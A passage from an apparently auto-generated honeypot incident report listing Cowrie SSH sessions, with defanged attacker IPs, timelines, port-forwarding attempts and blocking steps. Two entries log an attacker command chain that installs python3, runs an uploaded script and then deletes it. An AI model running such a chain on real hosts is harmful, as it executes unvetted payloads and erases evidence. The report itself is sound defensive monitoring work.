| `2026-07-29 10:38:41` | `cowrie.session.connect` |
| `2026-07-29 10:38:41` | `cowrie.client.version` |
| `2026-07-29 10:38:41` | `cowrie.client.kex` |
| `2026-07-29 10:38:41` | `cowrie.login.success` |
| `2026-07-29 10:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c79767e43d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 10:38 |
| **Last Seen** | 2026-07-29 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:38:41` | `cowrie.session.connect` |
| `2026-07-29 10:38:41` | `cowrie.client.version` |
| `2026-07-29 10:38:41` | `cowrie.client.kex` |
| `2026-07-29 10:38:41` | `cowrie.login.success` |
| `2026-07-29 10:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-857a895f8102

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-07-29 10:41 |
| **Last Seen** | 2026-07-29 10:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:41:40` | `cowrie.session.connect` |
| `2026-07-29 10:41:41` | `cowrie.client.version` |
| `2026-07-29 10:41:41` | `cowrie.client.kex` |
| `2026-07-29 10:41:43` | `cowrie.login.success` |
| `2026-07-29 10:41:44` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:41:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd703de9557

| Field | Detail |
|---|---|
| **Source IP** | `45.205.18[.]52` |
| **First Seen** | 2026-07-29 10:44 |
| **Last Seen** | 2026-07-29 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:44:29` | `cowrie.session.connect` |
| `2026-07-29 10:44:29` | `cowrie.client.version` |
| `2026-07-29 10:44:30` | `cowrie.client.kex` |
| `2026-07-29 10:44:31` | `cowrie.login.success` |
| `2026-07-29 10:44:33` | `cowrie.session.params` |
| `2026-07-29 10:44:33` | `cowrie.command.input` |
| `2026-07-29 10:44:33` | `cowrie.log.closed` |
| `2026-07-29 10:44:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.18[.]52` to AbuseIPDB if not already reported
- [ ] Block `45.205.18[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24159d669a9e

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-29 10:50 |
| **Last Seen** | 2026-07-29 10:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:50:52` | `cowrie.session.connect` |
| `2026-07-29 10:50:52` | `cowrie.client.version` |
| `2026-07-29 10:50:52` | `cowrie.client.kex` |
| `2026-07-29 10:50:53` | `cowrie.login.success` |
| `2026-07-29 10:50:54` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:50:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9325658d3407

| Field | Detail |
|---|---|
| **Source IP** | `197.251.249[.]75` |
| **First Seen** | 2026-07-29 10:51 |
| **Last Seen** | 2026-07-29 10:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:51:00` | `cowrie.session.connect` |
| `2026-07-29 10:51:00` | `cowrie.client.version` |
| `2026-07-29 10:51:00` | `cowrie.client.kex` |
| `2026-07-29 10:51:02` | `cowrie.login.success` |
| `2026-07-29 10:51:03` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:51:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.251.249[.]75` to AbuseIPDB if not already reported
- [ ] Block `197.251.249[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbbf10ecd4f3

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-07-29 10:56 |
| **Last Seen** | 2026-07-29 10:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:56:42` | `cowrie.session.connect` |
| `2026-07-29 10:56:43` | `cowrie.client.version` |
| `2026-07-29 10:56:43` | `cowrie.client.kex` |
| `2026-07-29 10:56:44` | `cowrie.login.success` |
| `2026-07-29 10:56:45` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef656bd852a6

| Field | Detail |
|---|---|
| **Source IP** | `85.105.255[.]56` |
| **First Seen** | 2026-07-29 10:56 |
| **Last Seen** | 2026-07-29 10:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:56:55` | `cowrie.session.connect` |
| `2026-07-29 10:56:55` | `cowrie.client.version` |
| `2026-07-29 10:56:55` | `cowrie.client.kex` |
| `2026-07-29 10:56:56` | `cowrie.login.success` |
| `2026-07-29 10:56:57` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.105.255[.]56` to AbuseIPDB if not already reported
- [ ] Block `85.105.255[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0f17d7db6a

| Field | Detail |
|---|---|
| **Source IP** | `220.163.252[.]244` |
| **First Seen** | 2026-07-29 11:05 |
| **Last Seen** | 2026-07-29 11:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:05:12` | `cowrie.session.connect` |
| `2026-07-29 11:05:13` | `cowrie.client.version` |
| `2026-07-29 11:05:13` | `cowrie.client.kex` |
| `2026-07-29 11:05:16` | `cowrie.login.success` |
| `2026-07-29 11:05:16` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:05:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.163.252[.]244` to AbuseIPDB if not already reported
- [ ] Block `220.163.252[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510a9c5c88df

| Field | Detail |
|---|---|
| **Source IP** | `117.205.3[.]26` |
| **First Seen** | 2026-07-29 11:08 |
| **Last Seen** | 2026-07-29 11:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:08:16` | `cowrie.session.connect` |
| `2026-07-29 11:08:17` | `cowrie.client.version` |
| `2026-07-29 11:08:17` | `cowrie.client.kex` |
| `2026-07-29 11:08:19` | `cowrie.login.success` |
| `2026-07-29 11:08:20` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `117.205.3[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8a5eafce330

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 11:09 |
| **Last Seen** | 2026-07-29 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:09:22` | `cowrie.session.connect` |
| `2026-07-29 11:09:22` | `cowrie.client.version` |
| `2026-07-29 11:09:22` | `cowrie.client.kex` |
| `2026-07-29 11:09:23` | `cowrie.login.success` |
| `2026-07-29 11:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-759e5700a612

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 11:09 |
| **Last Seen** | 2026-07-29 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:09:23` | `cowrie.session.connect` |
| `2026-07-29 11:09:23` | `cowrie.client.version` |
| `2026-07-29 11:09:23` | `cowrie.client.kex` |
| `2026-07-29 11:09:24` | `cowrie.login.success` |
| `2026-07-29 11:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bc363a973c8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 11:09 |
| **Last Seen** | 2026-07-29 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:09:30` | `cowrie.session.connect` |
| `2026-07-29 11:09:30` | `cowrie.client.version` |
| `2026-07-29 11:09:30` | `cowrie.client.kex` |
| `2026-07-29 11:09:31` | `cowrie.login.success` |
| `2026-07-29 11:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cec8eface2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-29 11:09 |
| **Last Seen** | 2026-07-29 11:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:09:31` | `cowrie.session.connect` |
| `2026-07-29 11:09:31` | `cowrie.client.version` |
| `2026-07-29 11:09:31` | `cowrie.client.kex` |
| `2026-07-29 11:09:32` | `cowrie.login.success` |
| `2026-07-29 11:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a202d3aa9ab

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-29 11:10 |
| **Last Seen** | 2026-07-29 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:10:49` | `cowrie.session.connect` |
| `2026-07-29 11:10:49` | `cowrie.client.version` |
| `2026-07-29 11:10:49` | `cowrie.client.kex` |
| `2026-07-29 11:10:50` | `cowrie.login.success` |
| `2026-07-29 11:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34bb54f9fcad

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-29 11:10 |
| **Last Seen** | 2026-07-29 11:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:10:49` | `cowrie.session.connect` |
| `2026-07-29 11:10:49` | `cowrie.client.version` |
| `2026-07-29 11:10:49` | `cowrie.client.kex` |
| `2026-07-29 11:10:50` | `cowrie.login.success` |
| `2026-07-29 11:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-badde37d91f4

| Field | Detail |
|---|---|
| **Source IP** | `111.70.1[.]159` |
| **First Seen** | 2026-07-29 11:16 |
| **Last Seen** | 2026-07-29 11:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:16:24` | `cowrie.session.connect` |
| `2026-07-29 11:16:25` | `cowrie.client.version` |
| `2026-07-29 11:16:25` | `cowrie.client.kex` |
| `2026-07-29 11:16:27` | `cowrie.login.success` |
| `2026-07-29 11:16:28` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:16:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.1[.]159` to AbuseIPDB if not already reported
- [ ] Block `111.70.1[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207c8097e245

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-07-29 11:16 |
| **Last Seen** | 2026-07-29 11:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:16:33` | `cowrie.session.connect` |
| `2026-07-29 11:16:33` | `cowrie.client.version` |
| `2026-07-29 11:16:33` | `cowrie.client.kex` |
| `2026-07-29 11:16:35` | `cowrie.login.success` |
| `2026-07-29 11:16:36` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6201311f57d5

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-07-29 11:22 |
| **Last Seen** | 2026-07-29 11:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:22:06` | `cowrie.session.connect` |
| `2026-07-29 11:22:07` | `cowrie.client.version` |
| `2026-07-29 11:22:07` | `cowrie.client.kex` |
| `2026-07-29 11:22:08` | `cowrie.login.success` |
| `2026-07-29 11:22:08` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21abd57316f4

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-07-29 11:22 |
| **Last Seen** | 2026-07-29 11:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:22:19` | `cowrie.session.connect` |
| `2026-07-29 11:22:20` | `cowrie.client.version` |
| `2026-07-29 11:22:20` | `cowrie.client.kex` |
| `2026-07-29 11:22:22` | `cowrie.login.success` |
| `2026-07-29 11:22:23` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c20e248b82bc

| Field | Detail |
|---|---|
| **Source IP** | `111.70.39[.]214` |
| **First Seen** | 2026-07-29 11:26 |
| **Last Seen** | 2026-07-29 11:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:26:54` | `cowrie.session.connect` |
| `2026-07-29 11:26:55` | `cowrie.client.version` |
| `2026-07-29 11:26:55` | `cowrie.client.kex` |
| `2026-07-29 11:26:58` | `cowrie.login.success` |
| `2026-07-29 11:26:59` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.39[.]214` to AbuseIPDB if not already reported
- [ ] Block `111.70.39[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f503cca6d9c6

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-07-29 11:27 |
| **Last Seen** | 2026-07-29 11:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:27:04` | `cowrie.session.connect` |
| `2026-07-29 11:27:04` | `cowrie.client.version` |
| `2026-07-29 11:27:04` | `cowrie.client.kex` |
| `2026-07-29 11:27:05` | `cowrie.login.success` |
| `2026-07-29 11:27:06` | `cowrie.direct-tcpip.request` |
| `2026-07-29 11:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc68aaeb6d13

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-29 11:28 |
| **Last Seen** | 2026-07-29 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:28:14` | `cowrie.session.connect` |
| `2026-07-29 11:28:14` | `cowrie.client.version` |
| `2026-07-29 11:28:14` | `cowrie.client.kex` |
| `2026-07-29 11:28:15` | `cowrie.login.success` |
| `2026-07-29 11:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9714f19f053d

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-29 11:28 |
| **Last Seen** | 2026-07-29 11:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:28:14` | `cowrie.session.connect` |
| `2026-07-29 11:28:14` | `cowrie.client.version` |
| `2026-07-29 11:28:14` | `cowrie.client.kex` |
| `2026-07-29 11:28:15` | `cowrie.login.success` |
| `2026-07-29 11:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ead6692842

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-29 11:28 |
| **Last Seen** | 2026-07-29 11:30 |
| **Session Duration** | 131s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:28:32` | `cowrie.session.connect` |
| `2026-07-29 11:28:32` | `cowrie.client.version` |
| `2026-07-29 11:28:32` | `cowrie.client.kex` |
| `2026-07-29 11:28:33` | `cowrie.login.success` |
| `2026-07-29 11:28:34` | `cowrie.session.file_upload` |
| `2026-07-29 11:28:35` | `cowrie.session.params` |
| `2026-07-29 11:28:35` | `cowrie.command.input` |
| `2026-07-29 11:28:35` | `cowrie.command.input` |
| `2026-07-29 11:28:35` | `cowrie.command.input` |
| `2026-07-29 11:28:36` | `cowrie.command.failed` |
| `2026-07-29 11:28:36` | `cowrie.log.closed` |
| `2026-07-29 11:28:37` | `cowrie.session.params` |
| `2026-07-29 11:28:37` | `cowrie.command.input` |
| `2026-07-29 11:28:37` | `cowrie.log.closed` |
| `2026-07-29 11:28:38` | `cowrie.session.params` |
| `2026-07-29 11:28:38` | `cowrie.command.input` |
| `2026-07-29 11:28:38` | `cowrie.log.closed` |
| `2026-07-29 11:28:39` | `cowrie.session.params` |
| `2026-07-29 11:28:39` | `cowrie.command.input` |
| `2026-07-29 11:28:39` | `cowrie.command.failed` |
| `2026-07-29 11:28:39` | `cowrie.command.failed` |
| `2026-07-29 11:29:41` | `cowrie.session.params` |
| `2026-07-29 11:29:41` | `cowrie.command.input` |
| `2026-07-29 11:30:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b790ed505d3

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-07-29 11:30 |
| **Last Seen** | 2026-07-29 11:33 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 11:30:58` | `cowrie.session.connect` |
| `2026-07-29 11:30:58` | `cowrie.client.version` |
| `2026-07-29 11:30:59` | `cowrie.client.kex` |
| `2026-07-29 11:30:59` | `cowrie.login.success` |
| `2026-07-29 11:31:01` | `cowrie.session.file_upload` |
| `2026-07-29 11:31:02` | `cowrie.session.params` |
| `2026-07-29 11:31:02` | `cowrie.command.input` |
| `2026-07-29 11:31:02` | `cowrie.command.input` |
| `2026-07-29 11:31:02` | `cowrie.command.input` |
| `2026-07-29 11:31:02` | `cowrie.command.failed` |
| `2026-07-29 11:31:03` | `cowrie.log.closed` |
| `2026-07-29 11:31:03` | `cowrie.session.params` |
| `2026-07-29 11:31:03` | `cowrie.command.input` |
| `2026-07-29 11:31:04` | `cowrie.log.closed` |
| `2026-07-29 11:31:05` | `cowrie.session.params` |
| `2026-07-29 11:31:05` | `cowrie.command.input` |
| `2026-07-29 11:31:05` | `cowrie.log.closed` |
| `2026-07-29 11:31:06` | `cowrie.session.params` |
| `2026-07-29 11:31:06` | `cowrie.command.input` |
| `2026-07-29 11:31:06` | `cowrie.command.failed` |
| `2026-07-29 11:31:06` | `cowrie.command.failed` |
| `2026-07-29 11:32:07` | `cowrie.session.params` |
| `2026-07-29 11:32:07` | `cowrie.command.input` |
| `2026-07-29 11:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-874070762d5b

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]201` |
| **First Seen** | 2026-07-29 11:32 |
| **Last Seen** | 2026-07-29 11:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
